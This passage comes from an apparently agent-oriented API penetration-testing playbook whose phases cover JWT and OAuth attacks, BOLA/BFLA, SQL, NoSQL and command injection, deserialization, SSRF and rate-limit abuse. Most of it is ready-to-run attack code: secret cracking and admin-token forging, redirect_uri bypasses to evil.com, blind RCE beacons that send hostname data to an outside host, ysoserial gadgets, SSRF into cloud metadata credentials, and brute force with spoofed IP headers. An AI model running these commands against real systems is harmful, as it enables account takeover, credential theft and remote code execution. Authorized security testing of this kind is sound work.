- **Validation:** The Collaborator fetch + subsequent acceptance of the attacker-signed token is unambiguous. For `kid` SQLi, a time-based payload confirming a DB lookup is corroborating evidence.
- **Evasion / edge cases:** `jku`/`x5u` allow-lists often do prefix/substring matches — try `https://allowed.com.evil.com` and `https://allowed.com@evil.com`.
- **Severity:** CVSS 3.1 9.8 — remote key control = full forgery.
- **Dispatch:** -> AuthAgent; `kid` SQLi confirmed -> SQLiAgent.

### 2.4 JWT: weak secret & claim/expiry tampering

- **Objective / hypothesis:** HS* secret is crackable, or claims/expiry are not enforced server-side.
- **Procedure:**
```bash
# Offline secret crack (HS256):
hashcat -a 0 -m 16500 "$JWT" /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# If cracked, mint an admin token:
python3 jwt_tool.py "$JWT" -S hs256 -p "<cracked_secret>" -I -pc role -pv admin -pc sub -pv "$U2_ID"

# Expiry enforcement — replay an expired token; claim tamper without re-signing (in case sig unchecked):
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $EXPIRED_JWT" "$API_BASE/v1/me" -w "expired=%{http_code}\n"
```
- **Indicators:** hashcat recovers a secret; expired token still returns 200; tampered `role`/`sub`/`tenant` accepted.
- **Validation:** Mint a fresh token with the cracked secret and prove cross-identity access; for expiry, confirm the token's `exp` is in the past yet authorizes.
- **Evasion / edge cases:** Many apps key on `sub`/`uid` but never check `tenant`/`org` — tamper those for cross-tenant access even with a valid signature path.
- **Severity:** Weak secret 9.1-9.8; missing expiry CVSS 3.1 ~7.5 (stolen-token longevity).
- **Dispatch:** -> AuthAgent.

### 2.5 JWT: storage/transport leakage

- **Objective / hypothesis:** Tokens leak via logs, referer, caching, or query strings.
- **Procedure:** Search captured traffic (`$ART/traffic.har`) and JS for tokens in URLs/`Referer`; check `Cache-Control` on token-bearing responses; confirm tokens are not echoed in error bodies.
- **Indicators:** JWT in a `GET` query, `Referer`, or a cacheable response.
- **Validation:** Reproduce the leak path; a token in a CDN-cacheable response is cross-user exposure.
- **Severity:** CVSS 3.1 ~6.5-7.5 depending on audience.
- **Dispatch:** -> AuthAgent; cacheable leak -> CachePoisoningAgent (note).

### 2.6 OAuth2 / OIDC: redirect_uri & PKCE

- **Objective / hypothesis:** `redirect_uri` validation is loose, or PKCE can be downgraded → auth-code theft → ATO.
- **Procedure:**
```bash
# redirect_uri allow-list bypass variants (capture the 302 Location):
for ru in "https://evil.com/cb" "$API_BASE/cb/../../evil" "https://$API_BASE.evil.com/cb" \
          "https://$TARGET_HOST@evil.com/cb" "$API_BASE/cb%2f%2e%2e%2fevil"; do
  curl -sk --proxy "$PROXY" -A "$UA" -i -o /dev/null -w "%{http_code} %{redirect_url} <= $ru\n" \
    "$API_BASE/oauth/authorize?client_id=CLIENT&response_type=code&scope=openid&state=xyz&redirect_uri=$ru"
done
# PKCE downgrade: omit code_challenge at /authorize, then exchange with empty verifier:
curl -sk --proxy "$PROXY" -A "$UA" -X POST "$API_BASE/oauth/token" \
  -d "grant_type=authorization_code&code=$CODE&redirect_uri=$VALID_RU&client_id=CLIENT&code_verifier="
```
- **Indicators:** 302 sending `code` to an attacker-controlled host; token endpoint issues tokens for a flow that never bound a `code_challenge`.
- **Validation:** Demonstrate the auth `code` actually arrives at the attacker host (open-redirect chain) and exchanges for a token. PKCE downgrade confirmed when a public client gets tokens without a verifier.
- **Evasion / edge cases:** Combine with a same-origin open redirect (those three-low chain) — see ExploitChainAgent. Try `response_mode=fragment` vs `query`; missing/replayable `state` enables login-CSRF.
- **Severity:** CVSS 3.1 8.1-9.1 — account takeover.
- **Dispatch:** -> OAuthAgent; open-redirect leg -> note for ExploitChainAgent.

### 2.7 OAuth2 / OIDC: scope, consent & refresh rotation

- **Objective / hypothesis:** Scope can be escalated, consent skipped, or refresh tokens are not rotated (replayable).
- **Procedure:**
```bash
# Scope escalation at authorize; consent re-prompt skipped for new scopes:
curl -sk --proxy "$PROXY" -A "$UA" -i "$API_BASE/oauth/authorize?client_id=CLIENT&response_type=code&redirect_uri=$VALID_RU&scope=openid+admin+offline_access"
# Refresh rotation: use the SAME refresh token twice — both must not succeed:
RT=<refresh_token>
curl -sk --proxy "$PROXY" -A "$UA" -X POST "$API_BASE/oauth/token" -d "grant_type=refresh_token&refresh_token=$RT&client_id=CLIENT" -o "$EVID/rt1.json"
curl -sk --proxy "$PROXY" -A "$UA" -X POST "$API_BASE/oauth/token" -d "grant_type=refresh_token&refresh_token=$RT&client_id=CLIENT" -o "$EVID/rt2.json"
```
- **Indicators:** Tokens issued with scopes the user never consented to; both refresh calls return new access tokens (no rotation/revocation).
- **Validation:** Decode issued access token and confirm the escalated scope is present and honored by a protected endpoint.
- **Evasion / edge cases:** Try injecting extra scopes only at `/token` (not `/authorize`); some servers re-derive scope from the request.
- **Severity:** CVSS 3.1 7.1-8.6 depending on scope reached.
- **Dispatch:** -> OAuthAgent.

### 2.8 Session: fixation, rotation, logout invalidation

- **Objective / hypothesis:** Session ID is not rotated on auth, not invalidated on logout, or attacker-fixable.
- **Procedure:**
```bash
PRE=$(curl -sk --proxy "$PROXY" -A "$UA" -c - "$API_BASE/" | awk '/session/{print $7}')
# Authenticate carrying PRE; if the post-login cookie == PRE, fixation:
curl -sk --proxy "$PROXY" -A "$UA" -b "session=$PRE" -c "$EVID/post-login.txt" -X POST "$API_BASE/v1/login" -d '{"u":"...","p":"..."}' -H 'Content-Type: application/json'
# Logout then reuse the cookie:
curl -sk --proxy "$PROXY" -A "$UA" -b "$EVID/post-login.txt" -X POST "$API_BASE/v1/logout"
curl -sk --proxy "$PROXY" -A "$UA" -b "$EVID/post-login.txt" "$API_BASE/v1/me" -w "post-logout=%{http_code}\n"
```
- **Indicators:** Same session value before and after login (fixation); 200 on `/me` after logout (no server-side invalidation).
- **Validation:** Reproduce with two browsers/sessions to prove a fixed/uninvalidated session grants access.
- **Severity:** CVSS 3.1 ~6.5-8.1.
- **Dispatch:** -> AuthAgent.

### 2.9 Gateway / edge auth bypass

- **Objective / hypothesis:** Edge routing trusts spoofable headers or path tricks to reach protected/backend routes.
- **Procedure:**
```bash
for combo in "-H X-Forwarded-For:127.0.0.1" "-H X-Original-URL:/v1/admin" "-H X-Rewrite-URL:/v1/admin" \
             "-H X-Forwarded-Host:internal" "-H X-Forwarded-Prefix:/internal"; do
  curl -sk --proxy "$PROXY" -A "$UA" $combo "$API_BASE/v1/admin/users" -o /dev/null -w "%{http_code} $combo\n"
done
# Path-confusion to dodge gateway authz that matches on prefix:
for p in "/public/../v1/admin/users" "/public/..;/v1/admin/users" "/public/%2e%2e/v1/admin/users" "/v1//admin/users" "/v1/admin/users/."; do
  curl -sk --proxy "$PROXY" -A "$UA" "$API_BASE$p" -H "Authorization: Bearer $U1" -o /dev/null -w "%{http_code} $p\n"
done
```
- **Indicators:** A protected route returns 200 only when a forwarding header or path-confusion variant is used.
- **Validation:** Confirm the bypassed route returns privileged data the normal path denied (diff bodies).
- **Evasion / edge cases:** Combine header spoof with method override (6.5). H2 desync at the gateway is covered in 12.3.
- **Severity:** CVSS 3.1 7.5-9.1 (auth bypass to admin).
- **Dispatch:** -> AuthAgent; smuggling-class bypass -> APIAgent/CRLFAgent (12.3).

**Phase 2 artifacts:** forged tokens + their responses (`$EVID/jwt-*.json`), `jwks.json`, OAuth 302/exchange captures, session evidence, `/tmp/bb-findings-auth.json` (+ archive to `$FIND`).
**Gate-out:** Every auth scheme tested across all identities; any bypass has a reproduced forged-credential PoC. Advance to Phase 3.

---

## PHASE 3: AUTHORIZATION — BOLA / BFLA / BOPLA (API1, API5, API3)

**Objective:** Prove cross-tenant object access (BOLA), privileged-function access (BFLA), and unauthorized property read/write (BOPLA) using the multi-identity matrix.
**Expert rationale:** This is where APIs fail most and worst. The server receives an object ID and a token; the only question is whether it re-checks that this token owns that object on this method. Test it object-by-object, method-by-method, version-by-version — never with one identity.
**Gate-in:** `U1`,`U2`,`ADMIN` tokens + known object IDs (1.5); `methods.txt`/`params.txt` available.
**Owning agents:** IDORAgent (BOLA/BFLA), APIAgent (BOPLA mass-assignment + excessive exposure). Parallelizable: 3.1-3.6 independent; matrices generated programmatically.

### 3.1 BOLA — cross-tenant object read

- **Objective / hypothesis:** U1's token can read U2's objects by substituting IDs.
- **Procedure:**
```bash
# Direct cross-identity reads (the canonical BOLA matrix):
for obj in "$U2_ID" "$U2_OBJ"; do
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" "$API_BASE/v1/users/$obj"        -o "$EVID/bola-$obj.json" -w "%{http_code} users/$obj\n"
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" "$API_BASE/v1/orders/$obj"       -w "%{http_code} orders/$obj\n" -o /dev/null
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" "$API_BASE/v1/users/$U2_ID/files" -w "%{http_code} users/$U2_ID/files\n" -o /dev/null
done
# ID in body / parameter pollution / nested location:
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" "$API_BASE/v1/orders?user_id=$U2_ID"
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' -d "{\"id\":\"$U2_OBJ\"}" "$API_BASE/v1/orders/lookup"
# Encoded/wrapped IDs: array, JSON, double-encode (to dodge naive ownership checks):
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" "$API_BASE/v1/users/$U1_ID%2C$U2_ID"
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -d "{\"id\":[\"$U1_ID\",\"$U2_ID\"]}" -H 'Content-Type: application/json' "$API_BASE/v1/users"
```
- **Indicators:** 200 returning U2's data under U1's token; the body contains U2-owned fields (email/order total) that U1 should never see.
- **Validation:** Diff against the same request under U2's own token — identical sensitive body proves cross-tenant read. A 200 with an empty/filtered body is NOT BOLA.
- **Evasion / edge cases:** Predictable IDs (sequential int, UUIDv1 timestamp) widen blast radius — enumerate a range. Try the older version (`/v1` vs `/v2`) where authz may be absent (links to 7.1). GUID guessing infeasible? Note as mitigating control.
- **Severity:** CVSS 3.1 6.5 (single-object PII read, AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) → up to 8.1+ with enumerable IDs / bulk PII.
- **Dispatch:** -> IDORAgent.

### 3.2 BOLA — cross-tenant object write/delete

- **Objective / hypothesis:** U1 can mutate/delete U2's objects.
- **Procedure:**
```bash
curl -sk --proxy "$PROXY" -A "$UA" -X PUT    -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com"}' "$API_BASE/v1/users/$U2_ID" -w "PUT=%{http_code}\n"
curl -sk --proxy "$PROXY" -A "$UA" -X PATCH  -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
  -d '{"status":"cancelled"}'        "$API_BASE/v1/orders/$U2_OBJ" -w "PATCH=%{http_code}\n"
curl -sk --proxy "$PROXY" -A "$UA" -X DELETE -H "Authorization: Bearer $U1" "$API_BASE/v1/orders/$U2_OBJ" -w "DELETE=%{http_code}\n"
```
- **Indicators:** 200/204 on write/delete of a U2 object; subsequent read (as U2) confirms the mutation took effect.
- **Validation:** Re-read the object as U2 to prove the change persisted — acceptance code alone is insufficient.
- **Evasion / edge cases:** Reversible-only as PoC; do not destroy real victim data — mutate a benign field or your own canary object owned by U2-test.
- **Severity:** CVSS 3.1 8.1-9.1 (integrity impact on others' data).
- **Dispatch:** -> IDORAgent.

### 3.3 BFLA — privileged function via low-priv token

- **Objective / hypothesis:** Admin/privileged functions are reachable with a regular user token.
- **Procedure:**
```bash
for ep in /v1/admin/users /v1/admin/settings /v1/admin/audit-logs /v1/users/$U1_ID/role /internal/metrics; do
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" "$API_BASE$ep" -o /dev/null -w "%{http_code} GET $ep\n"
done
# Privileged mutation as low-priv:
curl -sk --proxy "$PROXY" -A "$UA" -X POST -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
  -d '{"role":"admin"}' "$API_BASE/v1/users/$U1_ID/role" -w "selfpromote=%{http_code}\n"
```
- **Indicators:** 200/204 on admin function under U1; compare with U1 denied vs ADMIN allowed.
- **Validation:** Confirm the function actually executed (e.g., role now `admin` on re-read) — the inverse of "admin endpoint returns 200 empty".
- **Severity:** CVSS 3.1 8.8-9.1 (privilege escalation).
- **Dispatch:** -> IDORAgent.

### 3.4 BFLA — HTTP method & verb confusion

- **Objective / hypothesis:** Authz is enforced on one method but not another (or an override header switches methods).
- **Procedure:**
```bash
# Same resource, every method, low-priv token:
for m in GET POST PUT PATCH DELETE; do
  curl -sk --proxy "$PROXY" -A "$UA" -X $m -H "Authorization: Bearer $U1" "$API_BASE/v1/admin/users/$U2_ID" -o /dev/null -w "%{http_code} $m\n"
done
# Method override (some stacks route on the override, authz on the real verb):
curl -sk --proxy "$PROXY" -A "$UA" -X POST -H "X-HTTP-Method-Override: DELETE" -H "Authorization: Bearer $U1" "$API_BASE/v1/admin/users/$U2_ID" -w "override=%{http_code}\n"
```
- **Indicators:** A method/override that succeeds where the documented one is blocked.
- **Validation:** Prove the side effect occurred (object deleted/created) not just status.
- **Severity:** CVSS 3.1 8.1-9.1.
- **Dispatch:** -> IDORAgent/APIAgent.

### 3.5 BOPLA — mass assignment (unauthorized property write)

- **Objective / hypothesis:** Extra properties (`role`,`isAdmin`,`balance`,`verified`,`tenant_id`) in a write are bound by the model.
- **Procedure:**
```bash
# Compare GET response keys to discover writable-but-hidden fields, then inject them on create/update:
jq 'keys' "$EVID/U1-me.json"
curl -sk --proxy "$PROXY" -A "$UA" -X PATCH -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
  -d '{"role":"admin","isAdmin":true,"verified":true,"balance":999999,"tenant_id":"'"$U2_ID"'"}' \
  "$API_BASE/v1/users/$U1_ID" -o "$EVID/massassign.json" -w "%{http_code}\n"
# Repeat via alternate content-type (parser may bind differently) — ties to 6.6:
curl -sk --proxy "$PROXY" -A "$UA" -X PATCH -H "Authorization: Bearer $U1" -H 'Content-Type: application/xml' \
  -d '<user><role>admin</role><isAdmin>true</isAdmin></user>' "$API_BASE/v1/users/$U1_ID" -w "xml=%{http_code}\n"
```
- **Indicators:** Re-reading the object shows the injected property took (now `role:admin`).
- **Validation:** Confirm the privileged property is honored (access an admin function), not merely stored.
- **Evasion / edge cases:** Nested objects (`{"user":{"role":"admin"}}`), array wrappers, and snake/camel variants (`is_admin` vs `isAdmin`) bypass naive allow-lists.
- **Severity:** CVSS 3.1 8.8-9.1 (privilege escalation / financial).
- **Dispatch:** -> APIAgent.

### 3.6 BOPLA — excessive data exposure (unauthorized property read)

- **Objective / hypothesis:** Responses over-return — sensitive properties the role should not see.
- **Procedure:**
```bash
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" "$API_BASE/v1/users/$U1_ID" \
  | jq 'paths(scalars) as $p | select($p[-1]|test("password|hash|secret|token|ssn|card|2fa|internal|salt|api_key";"i")) | {($p|join(".")): getpath($p)}'
# Diff what admin sees vs user on the same list endpoint (server-side filtering check):
diff <(curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $ADMIN" "$API_BASE/v1/users" | jq '.[0]|keys') \
     <(curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1"    "$API_BASE/v1/users" | jq '.[0]|keys')
```
- **Indicators:** `password_hash`/`2fa_secret`/`internal_id`/`tenant` present in a non-privileged response.
- **Validation:** Confirm the field carries a real secret value (not a null placeholder) and is returned to a role that should not receive it.
- **Severity:** CVSS 3.1 5.3-7.5 (secret material → higher).
- **Dispatch:** -> APIAgent; exposed credential material -> SecretsExposureAgent (note).

**Phase 3 artifacts:** BOLA/BFLA matrices (request/response pairs in `$EVID`), mass-assignment + over-exposure evidence, `/tmp/bb-findings-idor.json`, `/tmp/bb-findings-api.json`.
**Gate-out:** Every crown-jewel object/function tested across user1/user2/admin and across versions/methods; each positive reproduced with a cross-identity diff. Advance to Phase 4.

---

## PHASE 4: INJECTION & SERVER-SIDE (SQLi, NoSQLi, RCE, CMDi, Deserialization, SSRF)

**Objective:** Drive every typed input parameter into its backend interpreter — SQL, NoSQL, OS shell, eval, deserializer, and server-side fetcher.
**Expert rationale:** APIs accept structured input the UI never exposed (sort fields, filter objects, callback URLs, serialized blobs). The schema (Phase 1) tells you exactly which parameters are strings vs numbers vs URLs vs objects — test each against the interpreter it most plausibly reaches.
**Gate-in:** `params.txt`/`data-models.json`; AppProfile injection hypotheses; OOB Collaborator armed.
**Owning agents:** SQLiAgent, NoSQLiAgent, RCEAgent, CommandInjectionAgent, DeserializationAgent, SSRFAgent. Parallelizable: each sub-technique by agent; all proxied through Burp.

### 4.1 SQL injection (REST params, JSON body, sort/order)

- **Objective / hypothesis:** A parameter reaches a SQL query (filter/sort/search) unsafely.
- **Procedure:**
```bash
# sqlmap via Burp, JSON body, targeted param, with tamper for WAF:
sqlmap -u "$API_BASE/v1/users/search" --data='{"name":"x","sort":"id"}' -p sort \
  --headers="Authorization: Bearer $U1\nContent-Type: application/json" \
  --proxy="$PROXY" -A "$UA" --batch --level=5 --risk=3 \
  --tamper=space2comment,between,charencode --technique=BEUST --output-dir="$ART/sqlmap"
# Manual time-based in JSON + ORDER BY context (high-signal, codes+timing):
for p in "1' OR SLEEP(5)-- -" "1) AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -" "name,(SELECT SLEEP(5))"; do
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
    -d "{\"sort\":\"$p\"}" "$API_BASE/v1/users/search" -o /dev/null -w "%{http_code} %{time_total}s :: $p\n"
done
```
- **Indicators:** sqlmap confirms injectable; manual time-based shows ~5s deltas tied to the payload; UNION/error variants leak rows.
- **Validation:** Repeat the delay payload with `SLEEP(0)` — fast response confirms causality, not load. Extract one benign datum (DB version) as proof.
- **Evasion / edge cases:** Sort/order params are blind-only (no quotes) — use boolean/time. JSON numeric params may be cast; try string-typed siblings. Stacked queries rare over web — prefer inline.
- **Severity:** CVSS 3.1 9.1-9.8 (data exfil / auth bypass).
- **Dispatch:** -> SQLiAgent.

### 4.2 NoSQL injection (operator / `$where` / regex)

- **Objective / hypothesis:** JSON body lets operators slip into a Mongo-style query.
- **Procedure:**
```bash
# Auth bypass via operator injection:
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}' "$API_BASE/v1/login" -w "ne=%{http_code}\n"
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$regex":"^a"}}' "$API_BASE/v1/login" -w "regex=%{http_code}\n"
# $where JS exec + regex DoS canary:
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' \
  -d '{"$where":"sleep(5000)||true"}' "$API_BASE/v1/users/search" -o /dev/null -w "where=%{time_total}s\n"
```
- **Indicators:** Login succeeds with operator objects; `$where` sleep produces a timing delta; regex extraction narrows a secret character-by-character.
- **Validation:** Operator-bypass confirmed when an authenticated response/token is returned; `$where` confirmed via reproducible timing.
- **Evasion / edge cases:** Send operators as nested JSON, or as `username[$ne]=` in form-encoded bodies (parser-dependent — ties to 6.6).
- **Severity:** CVSS 3.1 8.1-9.8 (auth bypass / extraction / DoS).
- **Dispatch:** -> NoSQLiAgent.

### 4.3 RCE via API parameters

- **Objective / hypothesis:** A parameter reaches `eval`/template/native exec.
- **Procedure:**
```bash
COLLAB=$(bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 1 2>/dev/null | jq -r '.host')
for p in '${7*7}' '{{7*7}}' '#{7*7}' '<%= 7*7 %>' '__import__("os").popen("id").read()'; do
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
    -d "{\"template\":\"$p\"}" "$API_BASE/v1/render" -o "$EVID/rce-$RANDOM.json" -w "%{http_code} :: $p\n"
done
# Blind RCE → OOB beacon (no output channel needed):
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
  -d "{\"name\":\"x\$(curl https://$COLLAB/rce?h=\$(hostname))\"}" "$API_BASE/v1/process"
bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 12 | tee "$EVID/rce-oob.json"
```
- **Indicators:** `49`/`343` reflected (template eval); Collaborator DNS/HTTP hit (blind exec).
- **Validation:** SSTI confirmed by polynomial (`{{7*7*7}}`=343); native exec confirmed by OOB beacon with host data.
- **Evasion / edge cases:** Distinguish template eval (`{{}}` → SSTIAgent territory) from shell exec; serialized blobs → 4.5.
- **Severity:** CVSS 3.1 9.8.
- **Dispatch:** -> RCEAgent; `{{}}` template eval -> note SSTIAgent.

### 4.4 OS command injection

- **Objective / hypothesis:** A parameter is concatenated into a shell command (filenames, hosts, conversion options).
- **Procedure:**
```bash
for pl in '; id' '| id' '$(id)' '`id`' '&& id' '%0aid' '|curl https://'"$COLLAB"'/ci'; do
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
    -d "{\"filename\":\"report${pl}\"}" "$API_BASE/v1/files/convert" -o /dev/null -w "%{http_code} %{time_total}s :: $pl\n"
done
# Argument injection into a wrapped binary (no metachars needed):
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -d '{"opts":"--checkpoint=1 --checkpoint-action=exec=id"}' -H 'Content-Type: application/json' "$API_BASE/v1/archive"
```
- **Indicators:** Command output reflected; time delay on `sleep`; Collaborator hit on blind.
- **Validation:** OOB beacon or reflected `uid=` confirms execution; argument-injection confirmed by the wrapped tool's behavior change.
- **Evasion / edge cases:** Spaces filtered → `${IFS}`, `{cmd,arg}`; Windows host → `&`, `^`, `certutil`, `powershell -enc`.
- **Severity:** CVSS 3.1 9.8.
- **Dispatch:** -> CommandInjectionAgent; full shell -> ExploitChainAgent.

### 4.5 Insecure deserialization

- **Objective / hypothesis:** A serialized object (Java/PHP/.NET/Python/Ruby/Node) is deserialized from a parameter/cookie/header.
- **Procedure:**
```bash
# Identify the format (magic bytes): rO0AB=Java, base64 'O:'=PHP, AAEAAAD=.NET, gASV=Python pickle.
# Blind confirm first with a DNS/URLDNS gadget, then escalate:
java -jar ysoserial.jar URLDNS "http://$COLLAB/deser" | base64 -w0 > /tmp/dns.b64
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
  -d "{\"state\":\"$(cat /tmp/dns.b64)\"}" "$API_BASE/v1/import" -o /dev/null -w "%{http_code}\n"
bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 12 | tee "$EVID/deser-oob.json"
# .NET / PHP equivalents: ysoserial.net, phpggc (match the classpath/deps).
```
- **Indicators:** Collaborator hit from the deserialization gadget = reachable sink.
- **Validation:** Confirm with the blind DNS gadget before any exec gadget; pick the gadget chain matching the server's libraries (don't spray).
- **Evasion / edge cases:** Signed/MAC'd blobs need the leaked key — hunt that first. Replicate the exact gzip/base64/url-encode wrapper or it never deserializes.
- **Severity:** CVSS 3.1 9.8 (typically RCE).
- **Dispatch:** -> DeserializationAgent; confirmed exec -> ExploitChainAgent.

### 4.6 SSRF via API parameters (API7)

- **Objective / hypothesis:** A URL/host/file parameter makes the server fetch attacker-chosen targets, reaching internal/cloud metadata.
- **Procedure:**
```bash
for u in "http://$COLLAB/ssrf" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
         "http://[::1]:80/" "http://127.0.0.1:8080/v1/admin" "file:///etc/passwd" \
         "http://metadata.google.internal/computeMetadata/v1/" "gopher://127.0.0.1:6379/_INFO"; do
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
    -d "{\"url\":\"$u\"}" "$API_BASE/v1/fetch" -o "$EVID/ssrf-$RANDOM.json" -w "%{http_code} :: $u\n"
done
bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 12 | tee "$EVID/ssrf-oob.json"
```
- **Indicators:** Collaborator hit from the server's egress IP; metadata/credential content in the response body; differential timing/error for internal vs external hosts (blind SSRF).
- **Validation:** OOB hit from the target's egress is definitive. For IMDS, a returned role/token confirms cloud-credential reach.
- **Evasion / edge cases:** Bypass allow-lists with `[::1]`, decimal/octal IPs, DNS-rebinding, `@`-confusion, redirect-to-internal (302 chain), and protocol smuggling (`gopher://`). IMDSv2 needs a PUT then GET — chain via the fetcher if it follows redirects.
- **Severity:** CVSS 3.1 8.6-9.1 (→ 9.8 with cloud credential theft).
- **Dispatch:** -> SSRFAgent; IMDS credential hit -> CloudExploitationAgent (note for ExploitChainAgent).

**Phase 4 artifacts:** sqlmap output, injection request/response pairs, OOB Collaborator logs (`$EVID/*-oob.json`), `/tmp/bb-findings-{sqli,nosqli,rce,cmdi,deser,ssrf}.json`.
**Gate-out:** Every typed parameter from `params.txt` exercised against its plausible interpreter; each positive has reflected/time/OOB proof. Advance to Phase 5.

---

## PHASE 5: UNRESTRICTED RESOURCE CONSUMPTION & SENSITIVE BUSINESS FLOWS (API4, API6)

**Objective:** Find missing/bypassable rate limits and quota controls (API4) and business flows that can be automated for abuse (API6).
**Expert rationale:** API4 is the availability/cost axis (CPU, memory, money); API6 is the "this flow was meant for humans at human speed" axis. Both are invisible to a single request — you must measure thresholds and model the business cost of automation.
**Gate-in:** Authenticated endpoints mapped; cost-bearing flows identified in AppProfile (signup, OTP, password reset, checkout, transfer, invite, search).
**Owning agents:** BusinessLogicAgent (API4 + API6 flows), RaceConditionAgent (concurrency/limit-overrun). Parallelizable: 5.1-5.4 vs 5.5-5.6.

### 5.1 Rate limit / quota presence & bypass (API4)

- **Objective / hypothesis:** A sensitive endpoint has no limit, or the limit keys on a spoofable attribute.
- **Procedure:**
```bash
# Baseline: how many before throttle? (ffuf for clean codes histogram, proxied)
ffuf -u "$API_BASE/v1/login" -X POST -d '{"u":"admin","p":"FUZZ"}' -H 'Content-Type: application/json' \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -x "$PROXY" -H "User-Agent: $UA" \
  -mc all -o "$ART/ratelimit-baseline.json" -of json -rate 50
# Bypass keys: rotate IP-spoof headers, casing, version, trailing chars:
for h in "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "X-Client-IP" "True-Client-IP"; do
  for i in $(seq 1 60); do curl -sk --proxy "$PROXY" -A "$UA" -o /dev/null -w "%{http_code}" \
    -H "$h: 10.0.$((RANDOM%255)).$((RANDOM%255))" -X POST -d '{"u":"x","p":"y"}' "$API_BASE/v1/login"; done | sort | uniq -c
  echo " <= via $h"
done
```
- **Indicators:** No 429 at high volume; or 429 disappears when a spoof header / casing variant is used.
- **Validation:** Confirm the bypass restores 200/auth attempts beyond the documented limit (compare histograms with/without the header).
- **Evasion / edge cases:** Per-user vs per-IP vs per-key limits — test each identity; GraphQL alias/batch bypass is covered in 9.2.
- **Severity:** CVSS 3.1 5.3-7.5 (credential-stuffing/brute-force enabler).
- **Dispatch:** -> BusinessLogicAgent.

### 5.2 Large / nested / array payload exhaustion (API4)

- **Objective / hypothesis:** No size/depth/element caps → memory/CPU exhaustion.
- **Procedure:**
```bash
# Oversized string body:
python3 -c "import json;print(json.dumps({'data':'A'*20000000}))" | \
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' --data-binary @- "$API_BASE/v1/process" -o /dev/null -w "bigstr=%{http_code} %{time_total}s\n"
# Deep nesting (parser stack/exponential):
python3 - <<'PY' | curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' --data-binary @- "$API_BASE/v1/parse" -o /dev/null -w "deep=%{http_code} %{time_total}s\n"
import json
d = {'k': 1}
for _ in range(5000): d = {'n': d}
print(json.dumps(d))
PY
# Array bomb:
python3 -c "import json;print(json.dumps({'items':list(range(2000000))}))" | \
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' --data-binary @- "$API_BASE/v1/batch" -o /dev/null -w "arr=%{http_code} %{time_total}s\n"
```
- **Indicators:** Sharp latency growth, 500/502/timeout at large sizes; no 413 cap.
- **Validation:** Increase size stepwise to find the cliff; reproducibility (not a one-off) confirms resource exhaustion. Keep it short and non-destructive — measure, do not DoS prod.
- **Evasion / edge cases:** Compressed body (zip-bomb) where the server decompresses; XML billion-laughs is in 12.1.
- **Severity:** CVSS 3.1 5.3-7.5 (availability).
- **Dispatch:** -> BusinessLogicAgent.

### 5.3 Pagination abuse (API4)

- **Objective / hypothesis:** `limit`/`per_page`/`offset` accept extreme/negative values → mass dump or exhaustion.
- **Procedure:**
```bash
for q in "per_page=1000000" "limit=-1" "limit=2147483647&offset=0" "page_size=999999"; do
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" "$API_BASE/v1/users?$q" -o /dev/null -w "%{http_code} %{size_download}B %{time_total}s :: $q\n"
done
```
- **Indicators:** Huge `size_download`/latency; full-table dump; negative limit returns everything.
- **Validation:** Confirm the response size scales with the param (not a fixed cap).
- **Severity:** CVSS 3.1 5.3-7.5; if it also defeats authz scoping, escalate.
- **Dispatch:** -> BusinessLogicAgent.

### 5.4 Cost / amplification (API4)

- **Objective / hypothesis:** One request triggers disproportionate cost (emails/SMS/webhooks/3rd-party calls/compute).
- **Procedure:** Trigger flows that fan out (invite-many, bulk-export, webhook-register, password-reset-spam) and measure downstream side effects (emails delivered, Collaborator callbacks per request).
